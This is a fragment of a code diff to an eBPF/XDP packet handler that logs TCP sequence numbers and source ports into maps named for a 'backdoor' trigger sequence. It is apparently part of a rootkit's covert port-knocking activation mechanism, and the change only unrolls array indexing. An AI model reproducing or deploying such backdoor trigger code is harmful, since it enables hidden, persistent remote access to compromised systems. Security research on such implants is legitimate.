@@ -208,7 +208,13 @@ int xdp_receive(struct xdp_md *ctx){
                 if(last_modified != 0 && last_modified != 1 && last_modified != 2){
                     return XDP_PASS;
                 }
-                b_new_data_32.trigger_array[last_modified].seq_raw = tcp->seq;
+                if(last_modified==0){
+                    b_new_data_32.trigger_array[0].seq_raw = tcp->seq;
+                }else if(last_modified==1){
+                    b_new_data_32.trigger_array[1].seq_raw = tcp->seq;
+                }else if(last_modified==2){
+                    b_new_data_32.trigger_array[2].seq_raw = tcp->seq;
+                }
                 bpf_map_update_elem(&backdoor_packet_log_32, &ipvalue, &b_new_data_32, BPF_ANY);
                 //If it was not the first packet received, this may be the end of the backdoor sequence (even if previous packets 
                 //where for other purpose, we must still check it)
@@ -253,7 +259,19 @@ int xdp_receive(struct xdp_md *ctx){
                 if(last_modified != 0 && last_modified != 1 && last_modified != 2 && last_modified != 3 && last_modified != 4 && last_modified != 5){
                     return XDP_PASS;
                 }
-                b_new_data_16.trigger_array[last_modified].src_port = tcp->source;
+                if(last_modified==0){
+                    b_new_data_16.trigger_array[0].src_port = tcp->source;
+                }else if(last_modified==1){
+                    b_new_data_16.trigger_array[1].src_port = tcp->source;
+                }else if(last_modified==2){
+                    b_new_data_16.trigger_array[2].src_port = tcp->source;
+                }else if(last_modified==3){
+                    b_new_data_16.trigger_array[3].src_port = tcp->source;
+                }else if(last_modified==4){
+                    b_new_data_16.trigger_array[4].src_port = tcp->source;
+                }else if(last_modified==5){
+                    b_new_data_16.trigger_array[5].src_port = tcp->source;
+                }
                 bpf_map_update_elem(&backdoor_packet_log_16, &ipvalue, &b_new_data_16, BPF_ANY);
                 //If it was not the first packet received, this may be the end of the backdoor sequence (even if previous packets 
                 //where for other purpose, we must still check it)
